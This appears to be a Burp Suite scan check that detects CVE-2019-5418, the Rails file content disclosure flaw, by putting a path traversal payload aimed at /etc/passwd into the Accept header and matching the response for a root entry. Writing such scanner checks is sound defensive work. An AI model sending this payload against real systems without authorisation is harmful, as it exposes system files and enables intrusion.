metadata:
    language: v2-beta
    name: "CVE-2019-5418 Rails File Content Disclosure Detected"
    description: "Tests for the CVE-2019-5418"
    author: "lUcgryy"
    tags: "Ruby-on-Rails", "CVE-2019-5418"

define:
    payload = "../../../../../../../../../etc/passwd{{"
    issueDetail = "Rails version smaller than (5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 and v3) are susceptible to a file content disclosure vulnerability because specially crafted accept headers can cause contents of arbitrary files on the target system's file system to be exposed."
    issueRemediation = "Apply the patch provided by the Rails team or upgrade to a version that includes the fix."
given request then
    send request:
        method: "GET"
        replacing headers:
            "Accept": `{payload}`
    if {latest.response} matches "root:.*:0:0:" then
        report issue:
            severity: high
            confidence: certain
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if
